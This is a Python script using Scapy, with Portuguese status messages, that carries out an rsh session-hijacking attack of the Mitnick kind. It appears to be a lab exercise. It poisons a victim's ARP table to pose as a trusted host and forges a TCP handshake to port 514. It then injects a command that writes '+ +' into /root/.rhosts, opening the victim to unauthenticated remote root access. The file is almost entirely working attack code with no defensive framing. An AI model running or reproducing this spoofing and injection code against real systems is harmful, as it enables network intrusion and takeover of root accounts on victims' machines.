from scapy.all import *
import time


def poison_arp_table(victim_addr, impersonated_addr):
    print(f"[>] Corrompendo tabela ARP de {victim_addr}: associando {impersonated_addr} ao nosso MAC...")

    victim_mac = getmacbyip(victim_addr)
    if victim_mac is None:
        victim_mac = "ff:ff:ff:ff:ff:ff"

    arp_pkt = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_addr, hwdst=victim_mac, psrc=impersonated_addr
    )
    sendp(arp_pkt, verbose=0)


def spoof_and_inject_rsh():
    victim_addr = "10.0.2.20"
    trusted_host = "10.0.2.30"
    rsh_port = 514
    fake_src_port = 1023

    poison_arp_table(victim_addr, trusted_host)
    time.sleep(1)

    print(f"[>] Emitindo SYN com origem forjada ({trusted_host})...")
    seq_num = 1000

    syn_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="S", seq=seq_num
    )

    print("[>] Monitorando trafego em espera do SYN/ACK...")
    pkt_sniffer = AsyncSniffer(
        filter=f"tcp and src host {victim_addr} and dst host {trusted_host}",
        count=1,
        timeout=5
    )
    pkt_sniffer.start()

    send(syn_pkt, verbose=0)

    pkt_sniffer.join()
    sniffed_pkts = pkt_sniffer.results

    if not (sniffed_pkts and sniffed_pkts[0].haslayer(TCP) and sniffed_pkts[0][TCP].flags == "SA"):
        print("[!] SYN/ACK nao detectado. Verifique se o flood esta ativo e se o ARP foi aceito.")
        return

    sa_reply = sniffed_pkts[0]
    remote_isn = sa_reply[TCP].seq
    print(f"[+] Handshake interceptado! ISN do alvo: {remote_isn}")

    ack_val = remote_isn + 1
    seq_num += 1

    print(f"[>] Concluindo three-way handshake com ACK...")
    ack_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="A",
        seq=seq_num, ack=ack_val
    )
    send(ack_pkt, verbose=0)

    print(f"[>] Injetando payload RSH na sessao ativa...")
    rsh_data = b"0\x00root\x00root\x00echo '+ +' > /root/.rhosts\x00"

    data_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="PA",
        seq=seq_num, ack=ack_val
    ) / rsh_data
    send(data_pkt, verbose=0)

    print("[+] Payload entregue. Verifique /root/.rhosts no alvo.")


if __name__ == "__main__":
    spoof_and_inject_rsh()
